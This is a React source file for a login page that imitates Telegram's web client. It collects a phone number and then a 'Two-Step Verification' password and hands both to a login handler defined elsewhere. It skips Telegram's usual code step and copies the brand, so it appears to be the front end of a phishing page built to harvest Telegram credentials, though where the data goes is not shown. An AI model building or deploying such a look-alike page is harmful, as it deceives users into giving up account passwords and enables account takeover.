import React, { useState } from "react";
import { MessageCircle, ArrowRight, Phone, Lock } from "lucide-react";
import useLogin from "./useLogin";

const Login = () => {
  const {
    handleNextStep,
    step,
    phoneNumber,
    setPhoneNumber,
    password,
    setPassword,
    handleLogin
  } = useLogin();
  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Logo */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-24 h-24 bg-blue-500 rounded-full mb-6 shadow-lg">
            <MessageCircle size={48} className="text-white" />
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-2">Telegram</h1>
          <p className="text-gray-600">
            {step === "phone" && "Enter your phone number to get started"}
            {step === "password" && "Enter your password"}
          </p>
        </div>

        {/* Login Card */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          {/* Phone Number Step */}
          {step === "phone" && (
            <div className="space-y-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Phone Number
                </label>
                <div className="relative">
                  <Phone
                    className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"
                    size={20}
                  />
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    placeholder="+1 (555) 000-0000"
                    className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>
              </div>

              <button
                onClick={() => handleNextStep("password")}
                disabled={!phoneNumber}
                className="w-full bg-blue-500 hover:bg-blue-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-xl transition flex items-center justify-center gap-2"
              >
                Next
                <ArrowRight size={20} />
              </button>

              <div className="text-center">
                <p className="text-sm text-gray-500">
                  By continuing, you agree to our{" "}
                  <a href="#" className="text-blue-500 hover:underline">
                    Terms of Service
                  </a>{" "}
                  and{" "}
                  <a href="#" className="text-blue-500 hover:underline">
                    Privacy Policy
                  </a>
                </p>
              </div>
            </div>
          )}

          {/* Password Step */}
          {step === "password" && (
            <div className="space-y-6">
              <div className="text-center mb-6">
                <div className="inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4">
                  <Lock size={28} className="text-blue-500" />
                </div>
                <h3 className="text-xl font-semibold text-gray-900 mb-2">
                  Two-Step Verification
                </h3>
                <p className="text-sm text-gray-600">
                  Your account is protected with an additional password
                </p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Password
                </label>
                <div className="relative">
                  <Lock
                    className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"
                    size={20}
                  />
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter your password"
                    className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                </div>
              </div>

              <button
                disabled={!password}
                onClick={()=>handleLogin(phoneNumber,password)}
                className="w-full bg-blue-500 hover:bg-blue-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-xl transition"
              >
                Login
              </button>

              <div className="text-center">
                <button className="text-blue-500 text-sm hover:underline">
                  Forgot password?
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-xs text-gray-500">
            Telegram for Web • Version 1.0
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
